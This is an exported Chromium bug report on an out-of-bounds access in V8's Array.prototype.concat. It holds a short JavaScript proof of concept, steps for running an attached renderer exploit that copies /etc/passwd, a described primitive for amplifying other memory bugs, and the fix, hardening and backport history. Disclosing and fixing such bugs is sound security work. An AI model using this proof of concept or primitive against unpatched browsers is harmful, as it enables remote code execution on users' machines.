# Security:  v8 Array.concat IterateElements OOB access leads to RCE

| Field | Value |
|-------|-------|
| **Issue ID** | [40055456](https://issues.chromium.org/issues/40055456) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **CVE IDs** | CVE-2017-5030 |
| **Reporter** | bt...@gmail.com |
| **Assignee** | is...@chromium.org |
| **Created** | 2021-04-05 |
| **Bounty** | $22,000.00 |

## Description

I. VULNERABILITY DETAILS

It is possible to trigger a callback during the computation of IterateElements used by Array.concat(). This is done by controlling the return type of Array.concat() (visitor variable) by setting the Symbol.species of the receiving element to the function. In this example we set TypedArray. When properties are set on our receiver during the IterateElements instruction the JSReceiver::CreateDataProperty [1] is called which doesn't trigger any getters or setters directly on our object due to the checks put in place after 681761 (CVE-2017-5030). However it is possible to trigger a callback because the codepath JSObject::CreateElement leads to a call Object::ToNumber when TypedArray's are passed as an argument [2]. Once these are bypassed the array can be shrunk and moved to old space leading to OOB read for infoleak and fakeobj for full RCE [3]

[1] https://source.chromium.org/chromium/chromium/src/+/master:v8/src/builtins/builtins-array.cc;l=1097;drc=3f9ff062b053155df7897f199e80a8bafe7c34df
[2] https://source.chromium.org/chromium/chromium/src/+/master:v8/src/objects/objects.cc;l=2805;drc=9ba6750ad3912c31b2c411cb309f724293859c41
[3] https://source.chromium.org/chromium/chromium/src/+/master:v8/src/builtins/builtins-array.cc;l=1095;drc=3f9ff062b053155df7897f199e80a8bafe7c34df

II. REPRODUCTION CASE

```
class Leaky extends Float64Array {}

let u32 = new Leaky (1000);
u32.__defineSetter__('length', function() {});

class MyArray extends Array {
    static get [Symbol.species]() {
        return function() { return u32; }
    };
}

var w = new MyArray(300);
w.fill(1.1);
delete w[1];
Array.prototype[1] = {
valueOf: function() {
   w.length = 1;
   gc();
   delete Array.prototype[1];
   return 1.1;
}
};

var c = Array.prototype.concat.call(w);

for (var i = 0; i < 32; i++) {
print(u32[i]);
}
```

A D8 RCE is attached and I will upload the chrome RCE soon with an exploit explanation.

III. ENVIRONMENT
Chrome Stable Version for Linux 89.0.4389.114 (64-bit)
Chrome Stable Version for Android 89.0.4389.105 (32-bit)


## Attachments

- [exploit.zip](attachments/exploit.zip) (application/octet-stream, 2.6 KB)
- [leak.js](attachments/leak.js) (text/plain, 589 B)
- [exploit.js](attachments/exploit.js) (text/plain, 8.0 KB)
- [exploit.html](attachments/exploit.html) (text/plain, 42 B)

## Timeline

### [Deleted User] (2021-04-05)

[Empty comment from Monorail migration]

### bt...@gmail.com (2021-04-05)

[Comment Deleted]

### dr...@chromium.org (2021-04-05)

I think you missed something with your PoC. gc seems to not be defined. Can you give a little more details on reproduction?

### ne...@google.com (2021-04-05)

[Empty comment from Monorail migration]

### bt...@gmail.com (2021-04-05)

[Comment Deleted]

### bt...@gmail.com (2021-04-05)

[Comment Deleted]

### [Deleted User] (2021-04-05)

Thank you for providing more feedback. Adding the requester to the cc list.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### bt...@gmail.com (2021-04-06)

@dbrubery to reproduce

The poc:
1. fetch v8 & cd v8
2. build x64-release
3. $ ./out/x64.release/d8 ./leak.js

The exploit:
1. unzip exploit.zip
2. fetch v8 && cd v8
3. build x64-release
4. $ ./out/x64.release/d8 ./exploit.js


### bt...@gmail.com (2021-04-06)

[Comment Deleted]

### bt...@gmail.com (2021-04-06)

Attached is an exploit for the renderer process.

Steps to reproduce

1. Install google chrome stable (89.0.4389.114)
2. Run google chrome stable with the --no-sandbox flag
3. Host exploit.html and exploit.js with an html server. I use python -m SimpleHTTPServer 8080
4. Navigate to exploit.html. google-chrome --no-sandbox http://localhost:8080/exploit.html
5. Check the /tmp directory for a new file `aaa` which contains the contents of /etc/passwd

or

1. fetch chromium && cd src
2. git --reset hard 89.0.4389.114
3. build release
4. Host exploit.html and exploit.js with an html server. I use python -m SimpleHTTPServer 8080
5. ./out/x64.release/out --no-sandbox http://localhost:8080/exploit.html
6. Check the /tmp directory for a new file `aaa` which contains the contents of /etc/passwd

Tested on Ubuntu 18.04 Linux 5.4.0-70-generic x86_64

### bt...@gmail.com (2021-04-06)

[Comment Deleted]

### bt...@gmail.com (2021-04-06)

[Comment Deleted]

### jd...@chromium.org (2021-04-06)

[Empty comment from Monorail migration]

### bt...@gmail.com (2021-04-06)

[Comment Deleted]

### jd...@chromium.org (2021-04-06)

ishell@: can you take a look at this (while verwaest@ is OOO) and help triage?

[Monorail components: Blink>JavaScript]

### jd...@chromium.org (2021-04-06)

Also CC cbruni@, who fixed crbug.com/682194 way back in 2017.

### jd...@chromium.org (2021-04-06)

Re: https://crbug.com/chromium/1195977#c14: Unfortunately, we're not super well equipped presently to delay pushing regression tests, but we aim to ship fixes as fast as possible (and thus keeping the patch gap as small as possible).

### [Deleted User] (2021-04-06)

Setting milestone and target because of Security_Impact=Stable and high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ad...@google.com (2021-04-06)

btiszka@ thanks for the report, and thanks for https://crbug.com/chromium/1195977#c14. n-day attacks remain a persistent problem. We don't have any systematized method to make fixes in private branches -- it can be done, but it tends to prevent any of our normal QA processes from happening (which is why we don't do it as a matter of course). If the V8 team can temporarily avoid checking in the regression test, that'd be great, but I'll leave it to their judgement to weigh up the security vs stability risks. Meanwhile though we are now better at pushing out fixes sooner, as we now have bi-weekly regular releases and we'll aim to ship the fix here in the next available such release after the fix lands.

### bt...@gmail.com (2021-04-06)

[Comment Deleted]

### is...@chromium.org (2021-04-06)

[Empty comment from Monorail migration]

### is...@chromium.org (2021-04-06)

btiszka@ thanks for the report! Amaizing!

I'm working on a fix for Array.concat.

Wasm team, FYI. See how far jump table can be used for constructing arbitrary executable code.

### gi...@appspot.gserviceaccount.com (2021-04-07)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/7989e04979c3195e60a6814e8263063eb91f7b47

commit 7989e04979c3195e60a6814e8263063eb91f7b47
Author: Igor Sheludko <ishell@chromium.org>
Date: Wed Apr 07 17:12:32 2021

[builtins] Fix Array.prototype.concat with @@species

Bug: chromium:1195977
Change-Id: I16843bce2e9f776abca0f2b943b898ab5e597e42
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/2810787
Reviewed-by: Camillo Bruni <cbruni@chromium.org>
Commit-Queue: Igor Sheludko <ishell@chromium.org>
Cr-Commit-Position: refs/heads/master@{#73842}

[modify] https://crrev.com/7989e04979c3195e60a6814e8263063eb91f7b47/src/builtins/builtins-array.cc
[modify] https://crrev.com/7989e04979c3195e60a6814e8263063eb91f7b47/src/objects/fixed-array-inl.h


### is...@chromium.org (2021-04-07)

I'll follow the suggestion in https://crbug.com/chromium/1195977#c14 and add the regression test once the fix reaches stable.

### [Deleted User] (2021-04-08)

[Empty comment from Monorail migration]

### [Deleted User] (2021-04-08)

[Empty comment from Monorail migration]

### [Deleted User] (2021-04-08)

This is sufficiently serious that it should be merged to stable. But I can't see a Chromium repo commit here, so you will need to investigate what - if anything - needs to be merged to M89. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.

This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here, so you will need to investigate what - if anything - needs to be merged to M90. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2021-04-08)

This bug requires manual review: We are only 4 days from stable.
Before a merge request will be considered, the following information is required to be added to this bug:

1. Does your merge fit within the Merge Decision Guidelines?
- Chrome: https://chromium.googlesource.com/chromium/src.git/+/master/docs/process/merge_request.md#when-to-request-a-merge
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. Links to the CLs you are requesting to merge.
3. Has the change landed and been verified on ToT?
4. Does this change need to be merged into other active release branches (M-1, M+1)?
5. Why are these changes required in this milestone after branch?
6. Is this a new feature?
7. If it is a new feature, is it behind a flag using finch?

Chrome OS Only:
8. Was the change reviewed and approved by the Eng Prod Representative? See Eng Prod ownership by component: http://go/cros-engprodcomponents

Please contact the milestone owner if you have questions.
Owners: govind@(Android), bindusuvarna@(iOS), cindyb@(ChromeOS), srinivassista@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@chromium.org (2021-04-09)

The Canary 91.0.4471.4 looks good to me. Can we move forward with merging the fix to M-89 and M-90 on Monday?

### bt...@gmail.com (2021-04-10)

I uploaded a second patch that hardens this codepath. This patch will prevent any variants of this vulnerability from happening again in the future. There have been a total of four vulnerabilities following this pattern in this code path 386988, 594574, 682194, and now 1195977. This patch will also remove an excellent exploitation primitive I found that can be used to "amplify" worse vulnerabilities that aren't easy to exploit.

The exploitation primitive works as follows:
1. Find a vulnerability that results in an OOB write or type confusion that is difficult to exploit.
2. Overwrite the "require_slow_elements()" bit of a Dictionary object.
3. Javascript execution in the middle of IterateElements is now possible because our corrupted object passes this check [1] because this [2] returns false.
4. Exploit using the same technique shown above.

Patch Explanation
-----
If javascirpt is ever executed after this check [3] it can be used to cause memory corruption. I have added `DisallowJavascirptExecution` to those scopes which crashes with a `CHECK` if javascript is ever executed in the `HasElement`, `GetElement`, or `CreateDataProperty` calls. The `if` statement in `IterateElements` [3] should prevent JavaScript from ever executing in normal situations, but this patch prevents anything like this from slipping through the cracks again.

[1] https://source.chromium.org/chromium/chromium/src/+/master:v8/src/builtins/builtins-array.cc;l=1076;drc=7989e04979c3195e60a6814e8263063eb91f7b47
[2] https://source.chromium.org/chromium/chromium/src/+/master:v8/src/objects/elements.cc;l=1423;drc=8ca5d3a5f1d3e18b363549c0edd4c2494cfb70ea
[3] https://source.chromium.org/chromium/chromium/src/+/master:v8/src/builtins/builtins-array.cc;l=1075-1078?q=builtins-array.cc


### bt...@gmail.com (2021-04-10)

[Comment Deleted]

### bt...@gmail.com (2021-04-11)

[Comment Deleted]

### bt...@gmail.com (2021-04-11)

[Comment Deleted]

### bt...@gmail.com (2021-04-11)

[Comment Deleted]

### bt...@gmail.com (2021-04-11)

[Comment Deleted]

### gi...@appspot.gserviceaccount.com (2021-04-12)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/8284359ed0607e452a4dda2ce89811fb019b4aaa

commit 8284359ed0607e452a4dda2ce89811fb019b4aaa
Author: Brendon Tiszka <btiszka@gmail.com>
Date: Sun Apr 11 03:37:18 2021

[builtins] Harden Array.prototype.concat.

Defence in depth patch to prevent JavaScript from executing
from within IterateElements.

R=ishell@chromium.org
R=cbruni@chromium.org

Bug: chromium:1195977
Change-Id: Ie59d468b73b94818cea986a3ded0804f6dddd10b
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/2819941
Reviewed-by: Camillo Bruni <cbruni@chromium.org>
Reviewed-by: Igor Sheludko <ishell@chromium.org>
Commit-Queue: Igor Sheludko <ishell@chromium.org>
Cr-Commit-Position: refs/heads/master@{#73898}

[modify] https://crrev.com/8284359ed0607e452a4dda2ce89811fb019b4aaa/AUTHORS
[modify] https://crrev.com/8284359ed0607e452a4dda2ce89811fb019b4aaa/src/builtins/builtins-array.cc


### is...@chromium.org (2021-04-12)

So, we must also merge the https://crbug.com/chromium/1195977#c36 (harmful and straightforward CL) in addition to https://crbug.com/chromium/1195977#c23.

### is...@chromium.org (2021-04-12)

btiszka@ thanks again!

### is...@chromium.org (2021-04-12)

adetaylor@, can we move forward with back merging to M-89 and M-90?

Also requesting back-merge of https://crbug.com/chromium/1195977#c36 to M-91.

### va...@chromium.org (2021-04-12)

Please go ahead and merge https://crbug.com/chromium/1195977#c36 to M-91.

Referring to adetaylor@ for M89 an M90

### gi...@appspot.gserviceaccount.com (2021-04-12)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/9c79cc67e8e512311b34699489628e8c62f56dd5

commit 9c79cc67e8e512311b34699489628e8c62f56dd5
Author: ishell@chromium.org <ishell@chromium.org>
Date: Mon Apr 12 15:35:39 2021

Merged: [builtins] Harden Array.prototype.concat.

Revision: 8284359ed0607e452a4dda2ce89811fb019b4aaa

BUG=chromium:1195977
NOTRY=true
NOPRESUBMIT=true
NOTREECHECKS=true
R=cbruni@chromium.org

Change-Id: Icc6a2a62c86ae2a66ac6bc1d22ed3816a223d1b9
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/2821537
Reviewed-by: Camillo Bruni <cbruni@chromium.org>
Cr-Commit-Position: refs/branch-heads/9.1@{#6}
Cr-Branched-From: 0e4ac64a8cf298b14034a22f9fe7b085d2cb238d-refs/heads/9.1.269@{#1}
Cr-Branched-From: f565e72d5ba88daae35a59d0f978643e2343e912-refs/heads/master@{#73847}

[modify] https://crrev.com/9c79cc67e8e512311b34699489628e8c62f56dd5/AUTHORS
[modify] https://crrev.com/9c79cc67e8e512311b34699489628e8c62f56dd5/src/builtins/builtins-array.cc


### is...@chromium.org (2021-04-12)

[Empty comment from Monorail migration]

### va...@chromium.org (2021-04-12)

Adding Chrome release managers as a heads up

### ad...@google.com (2021-04-12)

ishell@ vahl@ thanks. I agree we should merge these to M90 for the next scheduled security refresh in a couple of weeks (unfortunately this has just missed tomorrow's M90 initial stable release). We normally do such merge approvals just a few days before release, to give everything maximum possible bake time on Canary. Is that OK with you or is there some extra urgency to land the M90 merge?

Brendan, thanks for the hardening patch :)

### is...@chromium.org (2021-04-12)

I'm fine with following the existing schedule/policy.
I'll check the Canary stability data in the next two days.

### gi...@appspot.gserviceaccount.com (2021-04-12)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/5fc035c500bf0d5f42dd5ba837594713cb39ef62

commit 5fc035c500bf0d5f42dd5ba837594713cb39ef62
Author: Brendon Tiszka <btiszka@gmail.com>
Date: Sun Apr 11 03:37:18 2021

[builtins] Harden Array.prototype.concat.

Defence in depth patch to prevent JavaScript from executing
from within IterateElements.

R=​ishell@chromium.org
R=​cbruni@chromium.org

Bug: chromium:1195977
Change-Id: Ie59d468b73b94818cea986a3ded0804f6dddd10b
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/2819941
Reviewed-by: Camillo Bruni <cbruni@chromium.org>
Reviewed-by: Igor Sheludko <ishell@chromium.org>
Commit-Queue: Igor Sheludko <ishell@chromium.org>
Cr-Commit-Position: refs/heads/master@{#73898}
(cherry picked from commit 8284359ed0607e452a4dda2ce89811fb019b4aaa)
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/2821950

[modify] https://crrev.com/5fc035c500bf0d5f42dd5ba837594713cb39ef62/AUTHORS
[modify] https://crrev.com/5fc035c500bf0d5f42dd5ba837594713cb39ef62/src/builtins/builtins-array.cc


### is...@chromium.org (2021-04-13)

janagrill@, should we merge this to M86 too?

### ja...@google.com (2021-04-13)

Yes, we are backporting all high-severity sec fixes to LTS. Thanks for bringing this to my attention! It has not popped up in our filter yet because it does not have a Release-X-MXX label yet. I will create a CL for M86 and I will assign one of the OWNERS to take a look. Thanks again :) 

### gi...@google.com (2021-04-13)

[Empty comment from Monorail migration]

### is...@chromium.org (2021-04-13)

Note, that the CL in https://crbug.com/chromium/1195977#c36 is also worth merging back.

### gi...@appspot.gserviceaccount.com (2021-04-13)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/1e35f647251009019485ddb2b371281b182d04b0

commit 1e35f647251009019485ddb2b371281b182d04b0
Author: Jana Grill <janagrill@google.com>
Date: Tue Apr 13 14:54:14 2021

[LTS-M86][builtins] Harden Array.prototype.concat.

Defence in depth patch to prevent JavaScript from executing
from within IterateElements.

R=​ishell@chromium.org
R=​cbruni@chromium.org

(cherry picked from commit 8284359ed0607e452a4dda2ce89811fb019b4aaa)

No-Try: true
No-Presubmit: true
No-Tree-Checks: true
Bug: chromium:1195977
Change-Id: Ie59d468b73b94818cea986a3ded0804f6dddd10b
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/2819941
Reviewed-by: Camillo Bruni <cbruni@chromium.org>
Reviewed-by: Igor Sheludko <ishell@chromium.org>
Commit-Queue: Igor Sheludko <ishell@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#73898}
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/2821961
Commit-Queue: Jana Grill <janagrill@chromium.org>
Reviewed-by: Victor-Gabriel Savu <vsavu@google.com>
Cr-Commit-Position: refs/branch-heads/8.6@{#76}
Cr-Branched-From: a64aed2333abf49e494d2a5ce24bbd14fff19f60-refs/heads/8.6.395@{#1}
Cr-Branched-From: a626bc036236c9bf92ac7b87dc40c9e538b087e3-refs/heads/master@{#69472}

[modify] https://crrev.com/1e35f647251009019485ddb2b371281b182d04b0/AUTHORS
[modify] https://crrev.com/1e35f647251009019485ddb2b371281b182d04b0/src/builtins/builtins-array.cc


### gi...@appspot.gserviceaccount.com (2021-04-13)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/8ebd894186ed74afb7236ee6981e63e545b26db0

commit 8ebd894186ed74afb7236ee6981e63e545b26db0
Author: Igor Sheludko <ishell@chromium.org>
Date: Wed Apr 07 17:12:32 2021

[LTS-M86][builtins] Fix Array.prototype.concat with @@species

(cherry picked from commit 7989e04979c3195e60a6814e8263063eb91f7b47)

No-Try: true
No-Presubmit: true
No-Tree-Checks: true
Bug: chromium:1195977
Change-Id: I16843bce2e9f776abca0f2b943b898ab5e597e42
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/2810787
Reviewed-by: Camillo Bruni <cbruni@chromium.org>
Commit-Queue: Igor Sheludko <ishell@chromium.org>
Cr-Original-Commit-Position: refs/heads/master@{#73842}
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/2823829
Commit-Queue: Jana Grill <janagrill@chromium.org>
Reviewed-by: Igor Sheludko <ishell@chromium.org>
Reviewed-by: Victor-Gabriel Savu <vsavu@google.com>
Cr-Commit-Position: refs/branch-heads/8.6@{#77}
Cr-Branched-From: a64aed2333abf49e494d2a5ce24bbd14fff19f60-refs/heads/8.6.395@{#1}
Cr-Branched-From: a626bc036236c9bf92ac7b87dc40c9e538b087e3-refs/heads/master@{#69472}

[modify] https://crrev.com/8ebd894186ed74afb7236ee6981e63e545b26db0/src/builtins/builtins-array.cc
[modify] https://crrev.com/8ebd894186ed74afb7236ee6981e63e545b26db0/src/objects/fixed-array-inl.h


### ja...@google.com (2021-04-13)

[Empty comment from Monorail migration]

### ad...@google.com (2021-04-14)

Approving merge to M90 assuming no problems have shown up with this. Please go ahead and merge.

### gi...@appspot.gserviceaccount.com (2021-04-14)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/c87b3c1157be0ce9c9df0a6f002e15b94c064b37

commit c87b3c1157be0ce9c9df0a6f002e15b94c064b37
Author: ishell@chromium.org <ishell@chromium.org>
Date: Wed Apr 14 20:58:27 2021

Merged: Squashed multiple commits.

Merged: [builtins] Fix Array.prototype.concat with @@species
Revision: 7989e04979c3195e60a6814e8263063eb91f7b47

Merged: [builtins] Harden Array.prototype.concat.
Revision: 8284359ed0607e452a4dda2ce89811fb019b4aaa

BUG=chromium:1195977
NOTRY=true
NOPRESUBMIT=true
NOTREECHECKS=true

Change-Id: Ic65e4ee3c5a91dc8f55edfb07cee664a6a1d6fff
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/2826126
Reviewed-by: Adam Klein <adamk@chromium.org>
Cr-Commit-Position: refs/branch-heads/9.0@{#36}
Cr-Branched-From: bd0108b4c88e0d6f2350cb79b5f363fbd02f3eb7-refs/heads/9.0.257@{#1}
Cr-Branched-From: 349bcc6a075411f1a7ce2d866c3dfeefc2efa39d-refs/heads/master@{#73001}

[modify] https://crrev.com/c87b3c1157be0ce9c9df0a6f002e15b94c064b37/AUTHORS
[modify] https://crrev.com/c87b3c1157be0ce9c9df0a6f002e15b94c064b37/src/builtins/builtins-array.cc
[modify] https://crrev.com/c87b3c1157be0ce9c9df0a6f002e15b94c064b37/src/objects/fixed-array-inl.h


### is...@chromium.org (2021-04-14)

[Empty comment from Monorail migration]

### ad...@google.com (2021-04-15)

[Empty comment from Monorail migration]

### ad...@google.com (2021-04-19)

[Empty comment from Monorail migration]

### ad...@google.com (2021-04-19)

[Empty comment from Monorail migration]

### bt...@gmail.com (2021-04-20)

[Comment Deleted]

### ad...@google.com (2021-04-20)

We'll almost certainly get to it at the VRP panel tomorrow but no promises, we have a bit of a backlog because the panel was not quorate last week.

### bt...@gmail.com (2021-04-20)

[Comment Deleted]

### am...@google.com (2021-04-22)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2021-04-23)

Congratulations, Brendon! The VRP Panel has decided to award you $22,000 for this report - as you've received a V8 bonus and patch bonus on this one. Please confirm you would still like this to be donated to the EFF and I'll update things on our side accordingly! 

### is...@chromium.org (2021-04-23)

+1! Congrats! ))

### bt...@gmail.com (2021-04-23)

Thank you amyressler@ and ishell@! Yes I would still like the entire reward donated+ to the EFF :)

### am...@chromium.org (2021-04-23)

[Comment Deleted]

### am...@chromium.org (2021-04-23)

[Empty comment from Monorail migration]

### am...@google.com (2021-04-26)

[Empty comment from Monorail migration]

### am...@chromium.org (2021-04-27)

VRP rewards have been processed for donation at the request of btiszka@


### is...@chromium.org (2021-04-29)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2021-04-29)

The following revision refers to this bug:
  https://chrome-internal.googlesource.com/v8/v8-internal/+/52ba272900b678cd5c9dfa744613cc6e2ddc47dd

commit 52ba272900b678cd5c9dfa744613cc6e2ddc47dd
Author: Igor Sheludko <ishell@google.com>
Date: Thu Apr 29 10:25:36 2021


### ad...@chromium.org (2021-05-18)

ishell@ please go ahead and merge the test.

### gi...@appspot.gserviceaccount.com (2021-05-27)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/1decfe647f430a2c59df9b1bb9cec6d7a89a34db

commit 1decfe647f430a2c59df9b1bb9cec6d7a89a34db
Author: Igor Sheludko <ishell@chromium.org>
Date: Thu May 27 11:50:28 2021

Regression test for http://crbug/1195977

Bug: chromium:1195977
Change-Id: Ic2fe906be7d700701f402c7bfb36c42f5a93ce24
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/2919824
Commit-Queue: Igor Sheludko <ishell@chromium.org>
Commit-Queue: Camillo Bruni <cbruni@chromium.org>
Auto-Submit: Igor Sheludko <ishell@chromium.org>
Reviewed-by: Camillo Bruni <cbruni@chromium.org>
Cr-Commit-Position: refs/heads/master@{#74818}

[add] https://crrev.com/1decfe647f430a2c59df9b1bb9cec6d7a89a34db/test/mjsunit/regress/regress-crbug-1195977.js


### is...@chromium.org (2021-05-27)

[Empty comment from Monorail migration]

### ad...@google.com (2021-07-13)

Brendon has requested that we delay disclosure for a week. Putting under embargo till then.

### [Deleted User] (2021-07-22)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### wf...@chromium.org (2021-08-16)

write ups for this:

Writeup 1: History of this bug - https://tiszka.com/blog/CVE_2021_21225.html
Writeup 2: Exploiting it, some fun V8 exploitation tricks, and how to disable JIT W^X with an arbitrary write - https://tiszka.com/blog/CVE_2021_21225_exploit.html

I've raised https://crbug.com/chromium/1240239 for the final technique of overwriting heap->write_protect_code_memory_

### am...@chromium.org (2021-08-16)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1195977?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40055456)*
